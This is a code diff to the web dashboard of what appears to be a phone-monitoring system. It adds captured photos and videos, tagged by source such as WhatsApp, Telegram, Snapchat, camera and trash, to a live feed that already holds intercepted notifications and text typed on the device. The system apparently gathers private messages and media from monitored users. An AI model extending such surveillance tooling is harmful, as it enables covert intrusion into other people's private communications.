@@ -235,6 +235,7 @@ header{
 .cr.typed .btime{color:rgba(255,255,255,.65)}
 .cr.unread .btime{color:var(--accent);font-weight:600}
 /* Bubble body text */
+.bact{font-size:11px;font-weight:700;color:var(--accent);margin-bottom:3px;text-transform:capitalize}
 .bmsg{font-size:14px;line-height:1.5;word-break:break-word;color:var(--muted)}
 .cr.unread .bmsg{color:var(--fg);font-weight:500}
 .cr.typed .bmsg{color:#fff;font-style:italic}
@@ -895,7 +896,30 @@ function imgUrl(u){return !u?'' : (u.startsWith('http')?u:`${SERVER}${u}?token=$
 function normNotif(n){return{_kind:'n',_uid:'n'+n.id,...n}}
 function normText(t){return{_kind:'t',_uid:'t'+t.id,id:t.id,package_name:t.package_name,app_label:t.app_label,title:null,text_body:t.text,received_at:t.received_at,captured_at:t.captured_at,is_read:true}}
 function normMedia(m){return{_kind:'m',_uid:'m'+m.id,id:m.id,package_name:m.package_name,app_label:m.app_label,image_url:m.media_url,display_name:m.display_name,received_at:m.received_at,captured_at:m.captured_at,media_type:m.media_type,source:m.source,durationMs:m.duration_ms,thumbnails:m.thumbnails||[],mimeType:m.mime_type}}
-function sortItems(){notifs.sort((a,b)=>new Date(b.received_at||b.posted_at)-new Date(a.received_at||a.posted_at))}
+function itemTime(n){return n._kind==='m'?(n.captured_at||n.received_at||n.posted_at):(n.received_at||n.posted_at||n.captured_at)}
+function mediaAction(n){
+  const video=String(n.media_type||'').startsWith('video'),noun=video?'video':'photo'
+  switch(n.source){
+    case 'trash':return `${noun} trashed`
+    case 'downloads':return `${noun} downloaded`
+    case 'camera':return `${noun} captured`
+    case 'share':
+    case 'shared_app':
+    case 'whatsapp':
+    case 'whatsapp_sent':
+    case 'telegram':
+    case 'snapchat':
+    case 'instagram':
+    case 'messenger':
+    case 'facebook':return `${noun} transferred`
+    case 'android_media':return `${noun} saved by app`
+    case 'media_store':return `${noun} on device`
+    case 'files':
+    case 'filesystem':return `${noun} from files`
+    default:return `${noun} captured`
+  }
+}
+function sortItems(){notifs.sort((a,b)=>new Date(itemTime(b))-new Date(itemTime(a)))}
 
 // ── State ─────────────────────────────────────
 let notifs=[],appFilter=null,searchQ='',timeFilter='all',unreadOnly=false
@@ -939,8 +963,8 @@ function filteredNotifs(){
   return notifs.filter(n=>{
     if(unreadOnly&&(n._kind!=='n'||n.is_read))return false
     if(appFilter&&n.package_name!==appFilter) return false
-    if(searchQ){const q=searchQ.toLowerCase();if(!(n.title||'').toLowerCase().includes(q)&&!(n.text_body||'').toLowerCase().includes(q)&&!(n.app_label||'').toLowerCase().includes(q)) return false}
-    const iso=n.received_at||n.posted_at,t=new Date(iso).getTime()
+    if(searchQ){const q=searchQ.toLowerCase(),hay=`${n.title||''} ${n.text_body||''} ${n.app_label||''} ${n.display_name||''} ${n.source||''}`.toLowerCase();if(!hay.includes(q)) return false}
+    const iso=itemTime(n),t=new Date(iso).getTime()
     if(timeFilter==='today') return dayKey(iso)===nowKey
     if(timeFilter==='earlier') return dayKey(iso)!==nowKey
     const h=parseInt(timeFilter);if(!isNaN(h)) return now-t<=h*3600000
@@ -952,7 +976,7 @@ function filteredNotifs(){
 function groupByDay(list){
   const map=new Map(),nowKey=dayKey(new Date()),yesKey=dayKey(new Date(Date.now()-86400000))
   for(const n of list){
-    const iso=n.received_at||n.posted_at,key=dayKey(iso),d=new Date(iso)
+    const iso=itemTime(n),key=dayKey(iso),d=new Date(iso)
     const lbl=key===nowKey?'Today':key===yesKey?'Yesterday':d.toLocaleDateString('en-US',{timeZone:TZ,weekday:'short',month:'short',day:'numeric'})
     const tk=key?new Date(`${key}T00:00:00+06:00`).getTime():0
     if(!map.has(key))map.set(key,{lbl,tk,items:[]})
@@ -982,8 +1006,9 @@ function buildRow(n){
   const srcs=iconSrcs(n.package_name),color=appColor(n.package_name),letter=appInit(n.app_label||n.package_name)
   const enc=srcs.length?` data-srcs="${esc(JSON.stringify(srcs))}" data-si="0"`:''
   const img=srcs.length?`<img class="cai" src="${esc(srcs[0])}" loading="lazy" onload="this.parentElement.classList.add('iv')" onerror="tryNextIcon(this.parentElement)" alt="">`:''
-  const ts=esc(n.received_at||n.captured_at||n.posted_at)
-  const mediaSrc=!isText&&n._kind==='m'?`<span class="msrc" title="${esc(n.package_name||'')}">${esc(gallerySource(n.source))}</span>`:''
+  const eventIso=itemTime(n),ts=esc(eventIso)
+  const mediaSrc=n._kind==='m'?`<span class="msrc" title="${esc(n.package_name||'')}">${esc(gallerySource(n.source))}</span>`:''
+  const mediaAct=n._kind==='m'?`<div class="bact">${esc(mediaAction(n))}</div>`:''
 
   if(isText){
     // ── Typed text: right-side bubble ──────────────
@@ -1001,14 +1026,17 @@ function buildRow(n){
     </div>`
   } else {
     // ── Notification: left-side bubble ─────────────
-    const preview=esc(n.title&&n.text_body?`${n.title}: ${n.text_body}`:(n.title||n.text_body||'No preview'))
+    const preview=n._kind==='m'
+      ? esc(n.display_name||mediaAction(n))
+      : esc(n.title&&n.text_body?`${n.title}: ${n.text_body}`:(n.title||n.text_body||'No preview'))
     const video=n._kind==='m'&&String(n.media_type||'').startsWith('video')
     const thumb=n.image_url?`<a class="cimg" href="${esc(imgUrl(n.image_url))}" target="_blank" rel="noopener" onclick="event.stopPropagation()"><img src="${esc(imgUrl(n.image_url))}" loading="lazy" alt="">${video?`<span class="cvid">▶ ${fmtDuration(n.durationMs)}</span>`:''}</a>`:''
     return`<div class="cr${unread?' unread':''}${sel?' selected':''}" data-id="${n._uid}" onclick="onRowClick('${n._uid}')">
       <div class="cr-inner">
         <div class="cav"><div class="cav-in" style="background:${color}"${enc}>${img}<span class="cal">${letter}</span></div><div class="udot"></div><div class="cck">${CHK}</div></div>
         <div class="bubble">
-          <div class="bh"><span class="bname">${app}</span>${mediaSrc}<span class="btime" data-ts="${ts}" title="${ts}">${timeLabel(n.received_at||n.posted_at)}</span></div>
+          <div class="bh"><span class="bname">${app}</span>${mediaSrc}<span class="btime" data-ts="${ts}" title="${ts}">${timeLabel(eventIso)}</span></div>
+          ${mediaAct}
           <div class="bmsg">${preview}</div>
           ${thumb}
         </div>
@@ -1124,6 +1152,12 @@ async function load(reset=false){
         if(searchQ)   tp.set('search',searchQ)
         const tr=await fetch(`${SERVER}/api/typed-text?${tp}`,{headers:hdrs()})
         if(tr.ok){const tj=await tr.json();notifs=notifs.concat((tj.data||[]).map(normText))}
+        const mp=new URLSearchParams({limit:100})
+        if(appFilter)    mp.set('package',appFilter)
+        if(searchQ)      mp.set('search',searchQ)
+        if(deviceFilter) mp.set('device',deviceFilter)
+        const mr=await fetch(`${SERVER}/api/media?${mp}`,{headers:hdrs()})
+        if(mr.ok){const mj=await mr.json();notifs=notifs.concat((mj.data||[]).map(normMedia))}
       }catch{}
       sortItems();rebuildAppCounts()
       if(!devices.length) loadDevices() // first load: fetch device list
@@ -1261,7 +1295,7 @@ function connectSSE(){
   evs.addEventListener('connected',()=>{dot.className='sdot live';clearTimeout(reconn)})
   evs.addEventListener('notification',e=>{try{insertIncoming(normNotif(JSON.parse(e.data)))}catch{}})
   evs.addEventListener('typedtext',e=>{try{insertIncoming(normText(JSON.parse(e.data)))}catch{}})
-  evs.addEventListener('media',()=>{if(!document.getElementById('gallery').hidden&&!galSelected.size)openGallery()})
+  evs.addEventListener('media',e=>{try{insertIncoming(normMedia(JSON.parse(e.data)))}catch{};if(!document.getElementById('gallery').hidden&&!galSelected.size)openGallery()})
   evs.onerror=()=>{dot.className='sdot';evs.close();reconn=setTimeout(connectSSE,5000)}
 }
 
